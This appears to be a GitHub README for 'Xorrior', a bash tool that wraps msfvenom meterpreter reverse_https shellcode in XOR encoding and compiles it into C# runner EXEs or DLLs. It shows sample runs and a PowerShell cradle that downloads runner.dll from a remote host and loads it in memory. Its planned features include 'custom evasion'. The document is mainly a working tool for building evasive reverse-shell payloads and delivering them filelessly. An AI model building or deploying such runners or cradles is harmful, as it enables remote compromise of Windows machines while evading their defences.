# Xorrior

<img width="744" height="248" alt="image" src="https://github.com/user-attachments/assets/ee2c2cb2-c855-42aa-882c-b22931e65db2" />

Automating the Conversion of XOR-Encoded Shellcode into Ready-to-Use EXE or DLL

This tool was written in bash to avoid the routine of:

1. Creating shellcode with msfvenom
2. Copying that shellcode into an XOR encoder
3. Copying the output out of the XOR encoder into a C# shellcode runner.

The tool does all of the above in a single bash script and produces file outputs in
 
 * Executable (EXE)
 
 * Dynamic Link Library (DLL)

Note: The tool requires that x86_64-w64-mingw32-g++ and the mono c# compiler is installed.
```r
sudo apt update

sudo apt install g++-mingw-w64-x86-64

sudo apt install mono-mcs
```


#### Example Usage: Generating an EXE
>`./xorrior.sh`

```PowerShell

Enter msfvenom payload [windows/x64/meterpreter/reverse_https]: 
Enter LHOST [tun0]: 
Enter LPORT [443]: 
Enter XOR key (decimal or 0x.. hex) [0x12]: 
Output file name [runner]: 
Output file type: exe or library (dll)? [exe]: 
[*] Generating shellcode payload...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 754 bytes
Final size of csharp file: 3863 bytes
[*] Building EXE shellcode runner...
[*] Compiling with mcs...

[+] Success! Generated runner.exe

```


#### Example Usage: Generating a DLL
>`./xorrior.sh`

```PowerShell

Enter msfvenom payload [windows/x64/meterpreter/reverse_https]: 
Enter LHOST [tun0]: 
Enter LPORT [443]: 
Enter XOR key (decimal or 0x.. hex) [0x12]: 
Output file name [runner]:  
Output file type: exe or library (dll)? [exe]: library
[*] Generating shellcode payload...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 806 bytes
Final size of csharp file: 4127 bytes
[*] Building DLL shellcode loader...
[*] Compiling with mcs...
runner_gen.cs(29,17): warning CS0472: The result of comparing value type `System.IntPtr' with null is always `false'
runner_gen.cs(29,30): warning CS0162: Unreachable code detected
Compilation succeeded - 2 warning(s)

[+] Success! Generated runner.dll
[*] DLL Info: Namespace = ReflectiveLoadDll, Class = Class1, Method = runner

```

Sample reflective loader to use with dll
```PowerShell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/runner.dll') 
$assem = [System.Reflection.Assembly]::Load($data) 
$class = $assem.GetType("ReflectiveLoadDll.Class1") 
$method = $class.GetMethod("runner") 
$method.Invoke(0, $null)
```

####  To-Dos
 
 * Build Modularity into the tool to :
     *  accept different encryption and encoding types
     *  accept different C, C# templates for flexibility e.g. including custom evasion etc.
 
 

